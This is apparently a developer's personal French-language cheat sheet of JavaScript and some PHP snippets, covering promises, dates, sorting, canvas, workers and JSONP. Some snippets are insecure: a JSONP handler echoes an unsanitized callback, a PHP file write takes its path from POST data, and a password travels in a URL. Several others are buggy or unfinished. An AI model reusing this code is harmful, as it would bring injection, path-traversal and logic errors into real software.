                                          let something=true;// ou false si reussi/echec
                                           alert("a");
                                           if(true)
                                           {
                                              resolve(something à retourner); // toujours mettre au moins un truc (parce que une fois dans une requete ajax il allait dans le then avant meme de passer par le resolve. QUand j'ai mis un truc ça a fonctionné)
                                              }
                                              else
                                              {
                                              reject(something à retourner); // ça renvoit une erreur et donc on va se retrouver sur LINKtootot
                                              }
                                            });
                    return promesse;
              }
        utilisation1: il faut remonter la promesse le plus haut j->UI pour que l'utilisateur final voit les erreurs catchees. Ne pas les cacher dans des console.log (mouais...)
              toto = mamethodeQuiRetourneUnePromesseDoncDedansCestToujoursAsychrone("dd")
                                                                toto.then((res)=>{console.log(res); //res = unobjetarenvoyerici}  // then arrive a un moment on sait pas quand en asynchrone et retourne une promesse. 2 arguments=fonctions: 1ere: si ok 2eme si ko
                                                                       ,function(err) {console.log(err); //err = l'objetderreurici}
                                                                .then(x=> return Promise.resolve("tata") ou Promise.reject("titi")).then... // on peut meme enchainer donc sur d'autres promises then..then..then
                            ).catch(err=>{return unemethode(err)}) LINKtootot
                            equivalent de 
                            ).catch(err=>unemethode(err));
                            equivalent de 
                            ).catch(function(err){.return UnTruc..});                              
        
        utilisation2:     Promise.all(unearraydepromesse) // ca ca renvoie normalement les datas. Pas les promesses. converti array de promesses en data
        Promise.all([
          unefonction(1), doit retourner une promesse
          unefonction(2),
          unefonction(3)])
          .then(recu=>recu.renvoituntruc) // ca ca renvoit une promesse.
          .then(res)=>{ // res est en fait une liste sur laquel on peut mettre foreach
          res.forEach(iteration=>unemethode(iteration.qqch))
          },(err)=>console.log(err)
pour recuperer le jour du mois month sur deux chiffre d'un objet Date                                                                                          
      utiliser moment.js :                                                                                                                                     
            var d = new Date();
            var daydeparture = moment(d).format("DD-MM-YYYY");
             var madate = moment(document.getElementById("daydeparture").value, "YYYY-MM-DD").format("DD-MM-YYYY"); //daydeparture est un input date. Sa valeur a toujours la forme yyyy-mm-dd
fenetre modale en javascript: 
   function frontwin(element)
    {
        document.getElementById("frontwin").style.display="block";
    }
    function closefrontwin()
    {
            document.getElementById("frontwin").style.display="none";
    }
    function stoppropagation() // si je clique dans un bouton, il va propager l'event à ses parents jusqu'en haut.
    {
        this.event.stopPropagation();
    }
    <div id="frontwin" style="display:none; position: absolute; background-color: rgba(0,0,0,0.4); height: 100%; margin-top: 0%; margin-left: 0%; text-align: center; z-index: 2; width: 100%;" onclick="closefrontwin();">
    <div style="display: table; position: absolute; background-color: white; height: 50%; margin-top: 9%; margin-left: 25%; text-align: center; width: 50%;" onclick="stoppropagation()">
        ddddddddd
    </div></div>
pour avoir la valeur max entre plusieurs valeurs : 
    Math.max(x,y,z,h.....) ou Math.max([x,y,z....])
pour avoir la valeur absolue absolute d'un chiffre: 
    Math.abs(monchiffre);
Recuperer le nom d'une classe objet javascript
    mavariable.constructor.name;
pour filtrer un array tableau:
    var monarrayfiltre = monancienarray.filter(
        function (todo) {
            return !todo.completed; // renvoyer true inclu ce record
          });
setter plusieurs variables:
    mavar1 = mavar2 = moncalcul; // on set les 2 variables en mm temps     
convertir un tableau en string: 
            var tab = ['5', '6', '12', '22', '20', '11', '9', '1', '8', '7', '11' ]
            var monstring = tab.join(); // join 
            monstring est = "5,6..."
            
faire un tri trier
        let tableauimbriques=[["a",8],["f",6],["g",3]["x",4]]
        return tableauximbriques.sort((a,b)=>{ // c'est comme en java: a c'est un element et b c'est un autre à comparer : ex: a=["f",6] et b=["x",4]
          const valueA=a[1];
          const valueB=b[1];
          if (valueA==valueB)return 0;
          else if (valueA>valueB)return 1;
          else if (valueA<valueB)return -1;
        });
        avant:
            var tab = ['5', '6', '12', '22', '20', '11', '9', '1', '8', '7', '11' ]
            // une fonction qui compare des chaines contenant des entiers
            function compare_entiers_func(a, b) {
              // Elle doit retourner:
              // -1 si a < b
              //  0 si a = b
              //  1 si a > b
              return parseInt(a) - parseInt(b) // pour convertir un string en chiffre chifre
            }
            // on trie le tableau en utilisant la fonction de comparaison
            // pour chaines contenant des entiers:
            tab.sort(compare_entiers_func)
controler le css:
    tester monobjet.style.unstyle==tototo ne marche que si on l'a sette en javascript. Ca ne permet pas de voir dans le css initial comment ça a ete sette.
    Pour le faire il faut faire:
      getComputedStyle(monobjet).monstyle==tototo       
pour les boutons mobile utiliser plutot: 
  document.getElementById("startRecord").ontouchend=function(){stopRecordBoucle();};
trier les options d'un select: 
                                                  function trier(type)
                                      											{
                                      												var elSel = document.getElementById('move'+type);
                                      												var tableau= new Array();
                                      												for (i=elSel.options.length-1; i>-1; i--)
                                      											  {
                                            											  
                                            											  var comparateur= elSel.options[i].text;
                                            											  comparateur=comparateur.substr(comparateur.lastIndexOf("] ")); // comparateur c'est ce qu'il y a apres les crochets des options du select
                                          											  tableau[i]=comparateur+","+elSel.options[i].text+","+elSel.options[i].value+","+elSel.options[i].selected;
                                      											  }
                                      												//tableau.sort(comparer);
                                      												tableau.sort();
                                      												for (i=0; i<tableau.length; i++)
                                        										{
                                                											var parts=tableau[i].split(",");
                                            											    elSel.options[i].text=parts[1];
                                            											    elSel.options[i].value=parts[2];
                                            											    if (parts[3]=="true")
                                            											    { 
                                            											    elSel.options[i].selected=true;
                                            											    }
                                            											    else
                                            											    {
                                            											    	elSel.options[i].selected=false;
                                            											    }
                                        										}
                                      												
faire preceder un chiffre d'un certain nombre de zeros: // regarder plutot DecimalFormat 
    function precedByZerosForLenght(number , lenght )
    {        
      number=number+"";                                                            
    	while (number.length<lenght)                            
    	{                                                                  
    		number = "0"+number;                   
    	}                                                                  
    	return number;                                            
    }
declarer et executer une fonction encapsulee independante isolee scope: 
            objetouVariableExporteeAlexterieurfacultatif = (function (linkplusclairfacultatif, moduleaaugmenterEtReexporterSiCeModuleEstPartageParPlusieursFichiersDistincts) {
                //code 
                peut voir toutes les variables (meme let et const) dehors.mais importer linkplusclairfacultatif de dehors comme ça est plus clair à comprendre plutot qu'une variable externe implicite. 
                mais ces variables et fonctions ici sont invisibles depuis dehors. privees sauf si je fais LINKscopejscommeexport
                objetouVariableExporteeAlexterieur = ....;
                return objetouVariableExporteeAlexterieurfacultatif;
                ou
                  moduleaaugmenterEtReexporterSiCeModuleEstPartageParPlusieursFichiersDistincts.nouvellemethode=function()....;
                  return moduleAAugmenterEtReexporterSiCeModuleEstPartageParPlusieursFichiersDistincts; 
            }(linkplusclairfacultatif, moduleAAugmenterEtReexporterSiCeModuleEstPartageParPlusieursFichiersDistincts||{}  )); // ||{} comme ca n'importe quel fichier peut se charger dans n'importe quel ordre asynchronement ca marche qd meme.
            ou bien 
            var f = function () {
                //code non exportable par contre si je fais LINKscopejscommeexport
            }();
            var f = function (window) { LINKscopejscommeexport
                //code exportable par voir ci dessous
            }(window);
            ailleurs : window.methodesOuVariableDansLeScopeCiDessusAccessible            
trim existe: 
    monstring.trim();
pour tester si une variable est un array est une table est un tableau type d'une variable: 
    if (value instanceof Array) 
    {}
pour mettre tous les caracteres en majuscule, minuscule: 
  monstring.toLowerCase(), monstring.toUpperCase()
rediriger vers une page pour mobile si ecran plus petit:     attention screen.width et height sont incorrect quand la page vient de charger. Faut faire un timeout ou mieux utiliser plutot window.innerWidth et window.innerHeight qui sont plus fiables
    <script> if (!document.URL.match("mobile.php$") && screen.width<=699){document.location="mobile.php";}</script>
                    .match("xxx") retourne une array si il trouve sinon il retourne null
connaitre l'URL de la page actuelle:
  document.URL
connaitre les bouts de l'URL: 
var newURL = window.location.protocol + "//" + window.location.host + "/" + window.location.pathname;
pour modifier la duree et son accelleration d'une animation css: 
        document.getElementById("animantisechegen").style.webkitTransitionTimingFunction ="linear";
        document.getElementById("animantisechegen").style.webkitTransitionDuration="0s";
        focuser.style.MozTransitionDuration="0s";
				focuser.style.oTransitionDuration="0s";
				focuser.style.msTransitionDuration="0s";
pour desactiver le clic droit:
      document.oncontextmenu = function(e){return false;};
pour detecter le navigateur mais c pas super precis! voir le site:http://diveintohtml5.info/everything.html 
      <body onload="
                  if (navigator.userAgent.indexOf('MSIE')!=-1 &&        // c'est internet explorer
                        (navigator.userAgent.indexOf('Trident/5.0')==-1 && // c'est une versio avancee de internet explorer
                        navigator.userAgent.indexOf('Trident/6.0')==-1)
                        ) 
                        {document.location.href='errorNavigator.php';}">
pour detecter si navigateur peut lire vorbid audio ogg: 
    if(document.getElementById(lecteur).canPlayType && document.getElementById(lecteur).canPlayType('audio/ogg; codecs="vorbis"').replace(/no/, ''))
pour detecter si navigateur peut lire vorbid audio mp3:                            
    if (!!(document.getElementById(lecteur).canPlayType && document.getElementById(lecteur).canPlayType('audio/mpeg;').replace(/no/, '')))                        
        //Utils
        
        convert 12hampm en 24h
                    var time = $("#starttime").val();
                    var hours = Number(time.match(/^(\d+)/)[1]);
                    var minutes = Number(time.match(/:(\d+)/)[1]);
                    var AMPM = time.match(/\s(.*)$/)[1];
                    if(AMPM == "PM" && hours<12) hours = hours+12;
                    if(AMPM == "AM" && hours==12) hours = hours-12;
                    var sHours = hours.toString();
                    var sMinutes = minutes.toString();
                    if(hours<10) sHours = "0" + sHours;
                    if(minutes<10) sMinutes = "0" + sMinutes;
                    alert(sHours + ":" + sMinutes);

                      function getOffset(evt) {  //  pour recuperer la position
                            var el = evt.target, // pour un objet en position absolute
                                x = 0,
                                y = 0;
                            x = evt.target.offsetLeft;
                            y=  evt.target.offsetTop;
                            return { x: x, y: y };
                            ou peut etre:
                          var el = evt.target,
                              x = 0,
                              y = 0;
                        
                          while (el && !isNaN(el.offsetLeft) && !isNaN(el.offsetTop)) {
                            x += el.offsetLeft - el.scrollLeft;
                            y += el.offsetTop - el.scrollTop;
                            el = el.offsetParent;
                          }
                        
                          x = evt.clientX - x;
                          y = evt.clientY - y;
                        
                          return { x: x, y: y };
                        }

                  //tester l'egalite de deux arrays
                      function arraysEqual(arr1, arr2) {
                  if(arr1.length !== arr2.length)
                      return false;
                  for(var i = arr1.length; i--;) {
                      if(arr1[i] !== arr2[i])
                          return false;
                  }
              
                  return true;
              }
                  // recuperer la taille d'un tableau
                  function getSizeOfArray(myArray)
                  {
                  	ret=0;
                  	for ( var indx in myArray) 
                  	{
                  		if ( ! isNaN(indx) ) 
                  		{
                  			ret ++;
                  		}
                  	}
                  	return ret;
                  }
                  function isDefined(value)
                  {
                  	printStacktrace();
                  	if (value==undefined || value=="undefined" || value==null || value=="") return false;
                  	else return true;
                  }
                  function displayTable(table)
                  {
                  	ret="";
                  	for (var i =0; i<table.length; i++)
                  	{
                  		if (table[i]!=undefined && table[i]!=null)
                  		{
                  			ret=ret+i+"-"+table[i]+",";
                  		}
                  	}
                  	ret=ret.substring(0,ret.length-1);
                  	return ret;
                  }
                  function erreur(e)
                  {
                  printStacktrace();
                    console.log("erreur");
                    //console.log(e);
                  }
                  function onError(e)
                  {
                  printStacktrace();
                  console.log(e);
                  }
                  function radioValue(name)
                  {
                  printStacktrace();
                    var value=-1;
                    var elements = document.getElementsByName(name);
                    for (var i=0; i < elements.length; i++)
                    {
                      if (elements[i].checked)
                      {
                         value = elements[i].value;
                        break;
                      }
                    }
                    return value;
                  }
                  
                   function selectOption(element, value)
                  {
                  printStacktrace();
                  								  for(var i = 0; i < element.options.length; i++) 
                  								  {
                  								    if (element.options[i].value==value)
                  								    {
                  								      element.options[i].selected=true;
                  								    }
                  								  }
                  }
                  
                    function isNull(element, index, array) {
                    printStacktrace();  
                    return (element == null);  
                  }
                  
                  function existvalue (tableau, valeur)
                  {
                  printStacktrace();
                    ret= -1;
                    for (var i=0; i<tableau.length; i++)
                    {
                      if (tableau[i]==valeur)
                      {
                       ret = i;
                       break;
                      }
                    }
                    return ret;
                  }
                  
                  function existObjectValue(tableau, valeur,field)
                  {
                  printStacktrace();
                    ret= -1;
                     if (tableau!=null)
                    {                      
                        for (var i=0; i<tableau.length; i++)
                        {
                          if (tableau[i][field]==valeur)
                          {
                           ret = tableau[i];
                           break;
                          }
                        }
                    }
                    return ret;
                  }  
                  pour avoir la date en milliseconde: 
                    (new Date).getTime()  
                  //pour comparer deux dates:Retourne:
                  	  //   0 si date_1=date_2    date_1 = new Date();
                    	  //   1 si date_1>date_2
                  	  //  -1 si date_1<date_2	  
                  	  function compare(date_1, date_2){ // hum attention pas sur que ce marche: utiliser plustot une conversion avec dateToMs
                  	  printStacktrace();
                  	    diff = date_1.getTime()-date_2.getTime(); // getTime retourne les millisecondes depuis 19??
                  	    return (diff==0?diff:diff/Math.abs(diff));
                  	  }
               	  //pour convertir millisecondes en jours, heures, minutes, secondes: 
                      function dhm(ms){
                                jours = Math.floor(ms / (24*60*60*1000));
                                 joursms=ms % (24*60*60*1000);
                                 heures = Math.floor((joursms)/(60*60*1000));
                                 heuresms=ms % (60*60*1000);
                                 minutes = Math.floor((heuresms)/(60*1000));
                                 minutesms=ms % (60*1000);
                                 sec = Math.floor((minutesms)/(1000));
                                 return jours+":"+heures+":"+minutes+":"+sec;
                            }
        
                  	  // pour convertir un string en date:
                  	  //On suppose que la date entree a ete validee auparavant
                  	  //au format dd/mm/yyyy
                  	  function getDate(strDate){
                      printStacktrace();	  
                  	    day = strDate.substring(10,12);
                  		month = strDate.substring(6,8);
                  		year = strDate.substring(0,4);
                  		hour = strDate.substring(13,15);
                  		min = strDate.substring(17,19);
                  		sec = strDate.substring(21,22);
                  		d = new Date();
                  		d.setDate(day);
                  		d.setMonth(month);
                  		d.setFullYear(year); 
                  		return d;  
                  	  }
                  	  
                  	function dateToMs(date)
                  	{
                  	printStacktrace();
                      date=date.replace(" ","");
                      date=date.replace(":","");
                      date=date.replace("-","");
                      date=date.replace("-","");
                      date=date.replace(":","");
                      return date;
                    }
                     les dates en javascript:
                     var d=new Date();
                        alert(d);
                        alert(d.getTime());
                        var h =new Date(d.getTime());
                        alert(h);
                        h.setTime(d.getTime());
                        alert(h);
                        alert(h.getDate()+"/"+h.getMonth()+"/"+h.getFullYear() +h.getHours());
                        var ap = "AM";
                        if (hour   > 11) { ap = "PM";        }
                        if (hour   > 12) { hour = hour - 12; }
                        if (hour   == 0) { hour = 12;        }
                  	function printStacktrace(nom)
                  	{
                        //afficher les fonctions appelantes
                  		  if (arguments.callee.caller.arguments.callee.caller!=undefined)
                  		{
                  		     // console.log(arguments.callee.caller.arguments.callee.caller.name+"->"+arguments.callee.caller.name);
                  		}
                  		  else if (nom!=undefined)
                  			  {
                  			//  	console.log(nom+"->");
                  			  }
                  	}
                  	function getIndexFromTableByElementValue(arrayName,arrayElement)
                  	{
                  	printStacktrace();
                  	var ret=-1;
                  	for(var i=0; i<arrayName.length;i++ )
                  	 { 
                  	    if(arrayName[i]==arrayElement)
                  	    {
                  	      ret=i;
                  	      break;
                  	    }
                  	}                               
                  	return ret;
                  	}
                  	function getLastIndexFromTableByElementValue(arrayName,arrayElement)
                  	{
                  	printStacktrace();
                  	var ret=-1;
                  	for(var i=arrayName.length; i>-1;i-- )
                  	 { 
                  	    if(arrayName[i]==arrayElement)
                  	    {
                  	      ret=i;
                  	      break;
                  	    }
                  	}                               
                  	return ret;
                  	}
                  	function getIndexFromTableByObjectFieldElementValue(arrayName,arrayObjectFieldElement,fieldName)
                  	{
                  	printStacktrace();
                  	  var ret=-1;
                  	  for(var i=0; i<arrayName.length;i++ )
                  	   { 
                  	    if(arrayName[i][fieldName]==arrayObjectFieldElement[fieldName])
                  	    {
                  	      ret=i;
                  	      break;
                  	    }
                  	  }                               
                  	  return ret;
                  	}
                  	function getFirstKeyFromTable(arrayName)
                  	{
                  		printStacktrace();
                  		var ret=-1;
                  		for(var i=0; i<arrayName.length;i++ )
                  		   {
                  			if (arrayName[i]!=undefined)
                  				{
                  				ret=i;
                  				break;
                  				}
                  		   }
                  		return ret;
                  	}
                  	  function removeFromTableByElementValue(arrayName,arrayElement)
                  	 {
                  	 printStacktrace();
                  	  for(var i=0; i<arrayName.length;i++ )
                  	   { 
                  	  if(arrayName[i]==arrayElement)
                  	  arrayName.splice(i,1); 
                  	  }                               
                  	  return arrayName;
                  	}
                  // end-Utils

jouer un fichier audio sans objet audio
        var request = new XMLHttpRequest();
        				  request.open('GET', url, true);
        				  request.responseType = 'arraybuffer';
        				  // Decode asynchronously
        				  var req=arguments.callee;
        				  request.onload = function() 
        				  {
        					  printStacktrace(req.name);
        				    context.decodeAudioData(request.response, function(buffer) 
        				   	{
        				   	printStacktrace();
        				      soundBuffer = buffer;
        				      playSound(soundBuffer);
    function playSound(buffer) 
      {
      printStacktrace();
        source = context.createBufferSource(); // creates a sound source
        source.buffer = buffer;                    // tell the source which sound to play
        //source.connect(filter);       
        //filter.connect(context.destination);       // connect the source to the context's destination (the speakers)
        source.connect(context.destination);
        sendMessageDisappear("messageAudio", "OK");
        source.noteOn(0);                          // play the source now
      }
pour faire du crossdoomain: jsonp:
        var s = document.createElement('script'); 
        s.src = "http://memoclap.com/AudioLoopLoadPrivateProjectsByPassword.php?pwd="+value;
        s.src += "&callback=validPasswordCallback"; 
        s.type = 'text/javascript'; 
        document.body.appendChild(s);
    et cote serveur: (en php ici):
        	$ret=$_GET['callback']."(objet json ici);"; // cela va appeller la methode callback(chose) que j'aurais predefini cote client;
le z-index en javascript s'ecrit:
  document.getElementById("divantiseche").style.zIndex=1; // attention zindex ne marche que si on a specifie la position:(absolute relative etc...)
controler la taille d'un fichier uploade cote client:
                                    var file = document.getElementById('files').files[0];
                                    if(file && file.size < 2000000) 
                                    { 
                                      // 2Mo                            
                                       xhr.send(formData);
                                    }
                                    else
                                    {
                                         sendMessage("messageAudio","Le fichier est trop gros. 2Mo max", "-100px", "41%");
                                    }
  pour avoir le stacktrace: 
    console.trace();
visibilite: 
style.visibility="visible" ou "hidden"
bordure: 
  elt.style.borderColor="red";
couleur de fond:
  s.style.backgroundColor="blue";
pour generer un numero aleatoire hasard hazard en javascript:
    Math.random()*10 // 10 c'est le numero+1max(donc la on a un num entre 0 et9) voir LINK_haqsdfsaqsdfrd 
pour acceder au filesystem:
    window.requestFileSystem
      (type(PERSISTENT ou TEMPORARY),
       size(1024*1024),
        successCallback(initFS est la methode appellee),
         opt_errorCallback(errorHandler est la methode appellee)
      );
      voir cet article:http://www.html5rocks.com/en/tutorials/file/filesystem/
pour enregistrer avec le micro: (NON pas encore comme ci dessous! utiliser recorder.js)
            <input type="button" value="R" onclick="record()">Demarrer l'enregistrement audio</input>
            <input type="button" value="S" onclick="stoprecord()">Stope l'enregistrement audio</input>
            var localMediaStream;
            var stoprecord = function() 
                {
                  //console.log(localMediaStream);
                  localMediaStream.stop();
                  //  recorder.getRecordedData(function(blob) 
                  //                            {
                  //                              // Upload blob using XHR2.
                   //                           }
                  //                         );
                };
                var record = function()
                {
                      if (hasGetUserMedia()) 
                      {
                        // Not showing vendor prefixes.
                        if (window.navigator.getUserMedia) 
                        {
                            // opera users (hopefully everyone else at some point)
                            window.navigator.getUserMedia({video:false,audio: true}, gotStream, erreur);
                        }
                        else if (window.navigator.webkitGetUserMedia) 
                        {
                              // webkit users
                              navigator.webkitGetUserMedia({video:true,audio: true}, gotStream, erreur);
                        }
                        else 
                        {
                            sendMessage("messageAudio","Cette fonctionalit&eacute; ne marche que sur <br> <a href='https://www.google.com/chrome/'>Chrome</a> et <a href='https://tools.google.com/dlpage/chromesxs/'>Chrome Canary</a> pour le moment.", "50%", "50%");
                        }
                      }
                      else
                      {
                        sendMessage("messageAudio","Cette fonctionalit&eacute; ne marche que sur <br> <a href='https://www.google.com/chrome/'>Chrome</a> et <a href='https://tools.google.com/dlpage/chromesxs/'>Chrome Canary</a> pour le moment.", "50%", "50%");
                      }
                }
                
                function gotStream(stream)
                {
                    console.log("c");
                    //  document.getElementById("lecteurAudio").src  = window.webkitURL.createObjectURL(stream);
                    // ou window.URL.createObjectURL(stream);
                    console.log(stream);
                    //source=window.webkitURL.createObjectURL(stream);
                    localMediaStream = stream;
                    stream.onended = function()
                    {
                      console.log("finstream");
                      document.getElementById("lecteurAudio").src  = window.webkitURL.createObjectURL(localMediaStream);
                    }
                }
                function erreur(e)
                {
                  console.log("erreur");
                  console.log(e);
                }
                function hasGetUserMedia() {
                  // Note: Opera builds are unprefixed.
                  console.log(navigator);
                  console.log(navigator.getUserMedia);
                  console.log(navigator.webkitGetUserMedia);
                  console.log(navigator.mozGetUserMedia);
                  console.log(navigator.navigator);
                //  return !!(navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia);
                return true;
                }
                

recuperer des elements par leur nom de classe: pour ajouter des elements à un tableau: 
    document.getElementsByClassName("nomboucle") (byclass par classe)
et si on veut merger plusieurs elements ayant des classesnames differents dans une seule liste faire: 
      var buttonToReduce = Array.prototype.slice.call(document.getElementsByClassName("button"), 0);
			var buttonToReduce = buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("buttonclose"), 0));
			var buttonToReduce =  buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("buttonmove"), 0));
			var buttonToReduce =  buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("switch2"), 0));
			var buttonToReduce =  buttonToReduce.concat(Array.prototype.slice.call(document.getElementsByClassName("buttonActive"), 0));
 			for (var i=0; i<buttonToReduce.length; i++)
			{
			buttonToReduce[i].classList.add("buttonsmall");
			}

onmouseout: 
    s'execute quand on bouge au dessus de l'objet
onmouselease: 
    s'execute quand on quitte l'objet!    
pour faire une image à la volee a la volee a la volee à la volee: (creer create instance)
            var img=new Image();
            img.src="clearmute.png";
pour faire un span ou autre objet à la volee a la volee a la volee à la volee: creer create instance            
            var span = document.createElement('span')
            span.innerHTML="Si vous voulez mettre votre publicit&eacute; ici, contactez nous: kanailaurent@gmail.com. Nous n'acceptons que des pubs orient&eacute;es th&eacute;&acirc;tre, spectacles, langues, cin&eacute;ma";            
pour scroller scrooler, ou focuser (que ce soit dans un div ou le windows) vers un element contenut dans le div qui a le scroll:
      (sinon voir css) 
        function showIt(idDeLelementSurLequelJeVeuxAvoirLeFocus)  
                {  
                  var el = document.getElementById(idDeLelementSurLequelJeVeuxAvoirLeFocus);  
                  el.scrollIntoView(false); // false: aligne en bas, true: aligne en haut
                  window.scrollBy(0,0); ou window.scrollTo(0,0);  
                }
pour faire defiler comme un prompteur:
            	focuser.style.backgroundImage="-webkit-linear-gradient(left, rgba(255, 255, 255, 0.0) 80%, rgba(255, 255, 255, 1) 90%, rgba(255, 255, 255, 0.0) 100%)";
            	focuser.style.backgroundImage="-moz-linear-gradient(left, rgba(255, 255, 255, 0.0) 80%, rgba(255, 255, 255, 1) 90%, rgba(255, 255, 255, 0.0) 100%)";
            	focuser.style.backgroundImage="-o-linear-gradient(left, rgba(255, 255, 255, 0.0) 80%, rgba(255, 255, 255, 1) 90%, rgba(255, 255, 255, 0.0) 100%)";
            	focuser.style.backgroundImage="-ms-linear-gradient(left, rgba(255, 255, 255, 0.0) 80%, rgba(255, 255, 255, 1) 90%, rgba(255, 255, 255, 0.0) 100%)";
                 pour mettre une image  : .style.backgroundImage="url('boutton.png')";
            	focuser.style.backgroundRepeat="no-repeat";
            	focuser.style.backgroundSize="0% 100%";
            setTimeout(function(){
            	focuser.style.webkitTransitionDuration=duration+"s";
            	focuser.style.MozTransitionDuration=duration+"s";
            	focuser.style.oTransitionDuration=duration+"s";
            	focuser.style.msTransitionDuration=duration+"s";
        			setTimeout(function()
        			{
        			focuser.style.backgroundSize="150% 100%";
            			setTimeout(function()
            					{
            						focuser.style.backgroundImage=""; // ou .style.backgroundImage="url('boutton.png')";
            						focuser.style.backgroundSize="";
            						focuser.style.webkitTransitionDuration="0s";
            						focuser.style.MozTransitionDuration="0s";
            						focuser.style.oTransitionDuration="0s";
            						focuser.style.msTransitionDuration="0s";
            					},duration*1000);
            			},100);
            },10);
pour scroller dans un div: 
    document.getElementById("saved").scrollTop=document.getElementById("saved").scrollTop+1;  
replace all replaceall remplace: 
      return txt.replace(new RegExp(replace, 'g'),with_this); // 'g' permet de remplacer tout!!!!
Si j'ai l'erreur is not a constructor
       c parce que j'ai quelquepart en global une variable qui a le meme nom que mon constructeur (ma fonction)
pour supprimer un element par son Id c le seul moyen: 
        element = document.getElementById("element-id");
        element.parentNode.removeChild(element);

pour faire un bouton retour arriere arrière:
    history.go(-1);
pour fermer fenetre en cours 
    window.close();
ouvrir toujours la meme fenetre
        onclick="window.open('<%=request.getContextPath()%>/I18NListLang.do?language=en', '_self','menubar=no, status=no, scrollbars=no, menubar=no, width=2px, height=2px');
ouvrir toujours une nouvelle fenetre (ou nouvel onglet selon browser: <a href="" target="_blank")
        onclick="window.open('<%=request.getContextPath()%>/I18NListLang.do?language=en', '_blank','menubar=no, status=no, scrollbars=no, menubar=no, width=2px, height=2px');
recharger la page:
  location.reload();
activer la fenêtre courante:
    self.focus();
introspection :
                          var func = tool[ev.type];  // ouaou!! c'est puissant! func c'est la fonction dont le nom est "ev.type" de l'objet tool qui est tool_pencil en fait c'est de l'introspection!
pour instancier une classe par reverseintrospection classname est un string
    var classname="blablamaclasse";                          
    var subcs  = window[classname];   
pour faire un onclick si ca ne marche pas par la methode simple faire comme ca:
  onclick="clique('toto',event)" // si on fait ca (meme en html) le event est envoyée à la méthode. pratique pour recup la position etc...
      closebtn.onclick = function() { isParsing=false; document.getElementById('prompt').style.display='none'};
pour faire un worker: workers : (web worker : web-worker : webworker :) 
          cote ui:
              WorkerMessge = function (cmd,parameter)
              {
               this.cmd=cmd;
               this.parameter=parameter;
              }
            var monWorker = new Worker('autoWorker.js');// path par rapport à la page html
            //les deux lignes ci dessous marchent et font la meme chose: 
                monWorker.addEventListener("message", function (event){console.log('Je recoisunmessageDepuisLeWorkerVersIci'); document.getElementById("workchrono").innerHTML = event.data;}, false);
                monWorker.onmessage = function (event) {console.log(''Je recoisunmessageDepuisLeWorkerVersICI'); document.getElementById("workchrono").innerHTML = event.data;};
              // On demarre le worker en lui envoyant la commande 'init'
              monWorker.postMessage(new WorkerMessage('hello', null));
              setTimeout("monWorker.terminate();",1000);       // pour killer le worker
              console.log("bbb");

          cote worker:
            function messageHandler(event)
            {
              var messageSent=event.data; // on a aussi event.data.url, event.data.msg
              switch(messageSent.cmd)
              {
                case "init":
                  var i=120;
                  countdown(i);
                break;
                case "hello":
                this.postMessage("blabla");
                break;
                 this.close();// pour killer le worker 
              }
            }
            this.addEventListener('message',messageHandler,false);
pour mettre une image dans un canvas :
   myimage = new Image();
   myimage.src="dina.jpg";
   // pour reinitialiser le canvas: faire un clear dessus: 
   ctx.clearRect(0, 0, canvas.width, canvas.height);
   //puis
   ctx.drawImage(myimage, 0, 0);
   mieux vaut peut etre faire ca: 
   setTimeout("ctx.drawImage(testImage, 0, 0);",1000); (ca marche mieux)
   ctx.drawImage(myimage, 0, 0,canvas.width, canvas.height);
   // ecrire du texte:
        ctx.font         = 'italic '+size+'px sans-serif'; ou ='bold 30px sans-serif';
                         ctx.textBaseline = 'top'; // obligatoire
                         ctx.fillStyle = 'blue';
                         puis
                          	  ctx.fillText(this.name, this.xT, this.yT+this.textPos*(size/2)
                          	  ctx.fillText  ('Hello world!', 0, 0); // ecrit simplement
                              et/ou
                              ctx.strokeText('Hello world!', 0, 50);*/ // ecrit les contours
    pour une forme: 
      ctx.stroke(); // pour les contours
      et/ou
      ctx.fill(); // pour l'interieur
    faire les contours d'un rectangle  border:
                    ctx.strokeStyle = "#0000ff";
                    	ctx.strokeRect(this.xT,this.yT,this.wT,this.hT);
Pour sauver un canvas sur le serveur en image png ou jpg il faut obligatoirement envoyer les donnees en POST sinon le fichier genere est pourri: 
              	    if (canvas.toDataURL().length>0)
            	    {
            	    		ans = canvas.toDataURL("image/png");
            	    		askValidator.ans=ans;
            	    		var formData = new FormData(document.getElementById("forText"));
                            formData.append('idp', idprojetEnCours); // Append extra data before send.
                            formData.append('fs', askValidator.fs); // Append extra data before send.
                            formData.append('ans', askValidator.ans); // Append extra data before send.
            	    		xhr.open('POST', "AudioLoopOnlinePushAnsDRW.php", true);
            	    		var req=arguments.callee;
            	    		xhr.onload = function(e)
            	    		{
            	    			askValidator.class_AskValidator.record.call(this);
            	    		};
            	    		xhr.send(formData);
            	    }
        Cote php:
          $idp= $_POST["idp"];
                  	$ans= $_POST["ans"];
                  	$fs= $_POST["fs"];
                  	$path="sons/".$idp."/ANS/".$_SESSION['uid']."/".$fs;
                  	if (!is_dir($path))
                  	{
                  		mkdir($path, 0755, true);
                  	}
                  	// fin cree le repertoire si n'existe pas
                  	$ans =  substr($ans,strpos($ans,",")+1);
                  	$decodedData = base64_decode($ans);
                  	$fp = fopen ($path."/ans.png", "w");
                  	fwrite($fp, $decodedData);
                	fclose ($fp);
pour mettre une variable reference dans le settimeout
        setTimeout(function() { 
          HideNum(someNum); 
        }, 200);
astuce pour que dans les boucles loop il y ait un timeout entre chaque boucle:
      // avec timeout il prend 3 secondes entre chaque boucle 
      i = 0; // est une variable globale
      function animation_loop() {
          someAnimation();
          .. du code...
          setTimeout(function() { i++; if (i < n) { animation_loop(); } }, 3000);
      }
      animation_loop();
      // Pas comme ca car la boucle s'execute a toute vitesse 
      for (var i = 0; i < n; i++) 
      {
        setTimeout(methodecallback, 3000 * i); // sans () à la methode
      };
pour faire un paint avec canvas: Attention ne jamais donner un style a un canvas mais faire ca:  <canvas width="300" height="203" id="imageView">
                      <div>
                      <strong class='tooltipPere'><img src="crayon.png" class="button modifier"  onclick="dessiner()"/><div class='tooltipFilsAbs'>Dessiner</div></strong>                                                                                 
                      <strong class='tooltipPere'><img src="clavier.png" class="button modifier"  onclick="ecrire()"/><div class='tooltipFilsAbs'>Ecrire</div></strong>
                      <strong class='tooltipPere'><img src="gomme.png" class="button modifier"  onclick="gommer()"/><div class='tooltipFilsAbs'>Gommer</div></strong>
